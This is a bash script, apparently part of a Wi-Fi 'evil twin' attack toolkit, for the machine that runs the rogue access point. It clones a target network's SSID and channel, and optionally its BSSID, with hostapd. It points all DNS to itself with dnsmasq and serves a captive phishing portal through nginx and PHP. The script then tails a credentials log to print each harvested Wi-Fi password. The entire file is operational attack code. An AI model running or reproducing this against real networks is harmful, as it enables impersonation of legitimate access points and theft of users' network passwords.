#!/usr/bin/env bash
# laptop-a-ap.sh — Laptop A. Rogue AP + DHCP/DNS + captive portal + harvest.
source "$(dirname "$0")/common.sh"
need_root
load_env
need_cmds hostapd dnsmasq nginx php-fpm8.2 ip

WORK="${WORK:-/tmp/eviltwin}"
PORTAL_DIR="${PORTAL_DIR:-/var/www/evil}"
AP_IF="${AP_IF:-wlan0}"
AP_IP="${AP_IP:-192.168.99.1}"
DHCP_RANGE="${DHCP_RANGE:-192.168.99.10,192.168.99.100,255.255.255.0,12h}"
PIN_BSSID="${PIN_BSSID:-0}"
LOG="$WORK/creds.log"
HOSTAPD_CONF="$WORK/hostapd.conf"
DNSMASQ_CONF="$WORK/dnsmasq.conf"
NGINX_SITE="/etc/nginx/sites-available/evil"
NGINX_LINK="/etc/nginx/sites-enabled/evil"

mkdir -p "$WORK" "$(dirname "$LOG")" "$PORTAL_DIR"
chmod 750 "$(dirname "$LOG")"

PIDS=()
cleanup() {
  set +e
  warn "tearing down AP"
  for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null; done
  pkill -f "hostapd $HOSTAPD_CONF" 2>/dev/null
  pkill -f "dnsmasq -C $DNSMASQ_CONF" 2>/dev/null
  rm -f "$NGINX_LINK"
  nginx -t >/dev/null 2>&1 && systemctl reload nginx 2>/dev/null
  ip addr flush dev "$AP_IF" 2>/dev/null
  ip link set "$AP_IF" down 2>/dev/null
  ok "clean"
}
trap cleanup EXIT INT TERM

# ── hostapd ───────────────────────────────────────────────────────────────
cat > "$HOSTAPD_CONF" <<EOF
interface=$AP_IF
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$TARGET_CH
auth_algs=1
wmm_enabled=1
ignore_broadcast_ssid=0
EOF
[[ "$PIN_BSSID" == "1" ]] && echo "bssid=$TARGET_BSSID" >> "$HOSTAPD_CONF"

info "hostapd on $AP_IF"
ip link set "$AP_IF" down || true
ip link set "$AP_IF" up
hostapd "$HOSTAPD_CONF" > "$WORK/hostapd.log" 2>&1 &
PIDS+=($!)
sleep 2
grep -q "AP-ENABLED" "$WORK/hostapd.log" || die "hostapd failed: $(tail -n3 "$WORK/hostapd.log")"
ok "rogue AP up: $TARGET_SSID ch $TARGET_CH"

# ── dnsmasq ───────────────────────────────────────────────────────────────
cat > "$DNSMASQ_CONF" <<EOF
interface=$AP_IF
bind-interfaces
dhcp-range=$DHCP_RANGE
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/$AP_IP
log-queries
log-dhcp
EOF
ip addr add "$AP_IP/24" dev "$AP_IF" 2>/dev/null || true
ip link set "$AP_IF" up
info "dnsmasq"
dnsmasq -C "$DNSMASQ_CONF" --no-daemon > "$WORK/dnsmasq.log" 2>&1 &
PIDS+=($!)
ok "dhcp/dns on $AP_IP"

# ── portal ────────────────────────────────────────────────────────────────
cp /dev/null "$LOG"; chmod 640 "$LOG"; chown www-data:www-data "$LOG" 2>/dev/null || true
cp "$REPO_ROOT/portal/index.html" "$PORTAL_DIR/index.html"
cp "$REPO_ROOT/portal/capture.php" "$PORTAL_DIR/capture.php"
sed -i "s|__TARGET_SSID__|$TARGET_SSID|g" "$PORTAL_DIR/index.html"

sed "s|__PORTAL_DIR__|$PORTAL_DIR|g; s|__AP_IP__|$AP_IP|g" \
  "$REPO_ROOT/nginx/evil.conf" > "$NGINX_SITE"
ln -sf "$NGINX_SITE" "$NGINX_LINK"
nginx -t >/dev/null 2>&1 || die "nginx config invalid"
systemctl reload nginx 2>/dev/null || systemctl restart nginx
ok "portal live on http://$AP_IP/"

# ── harvest ───────────────────────────────────────────────────────────────
ok "watching $LOG — ctrl-c to stop"
tail -n 0 -F "$LOG" | while IFS=$'\t' read -r ts ip ssid pw ua; do
  c '1;32' "[captured] $ip  ssid=$ssid  pw=$pw"
done
